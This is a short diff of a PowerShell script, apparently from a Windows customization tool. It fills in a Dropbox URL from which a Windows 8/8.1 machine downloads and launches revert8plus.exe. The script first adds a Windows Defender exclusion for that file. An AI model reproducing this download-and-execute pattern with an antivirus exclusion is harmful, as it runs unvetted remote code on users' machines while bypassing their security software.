@@ -3,7 +3,7 @@ if ([Environment]::OSVersion.Version.Build -in @(9200, 9600)) {
   if ([Environment]::OSVersion.Version.Build -ne 9200) {
     Add-MpPreference -ExclusionPath "${env:temp}\revert8plus.exe"
   }
-  Invoke-WebRequest -UseBasicParsing '' -Output "${env:temp}\revert8plus.exe"
+  Invoke-WebRequest -UseBasicParsing 'https://www.dropbox.com/scl/fi/pmi8zyhmjlat3fgv6djbu/revert8.exe?rlkey=qn9zt3myycbnqzu8r306lhxu0&dl=0' -Output "${env:temp}\revert8plus.exe"
   Start-Process "${env:temp}\revert8plus.exe"
   exit;
 }
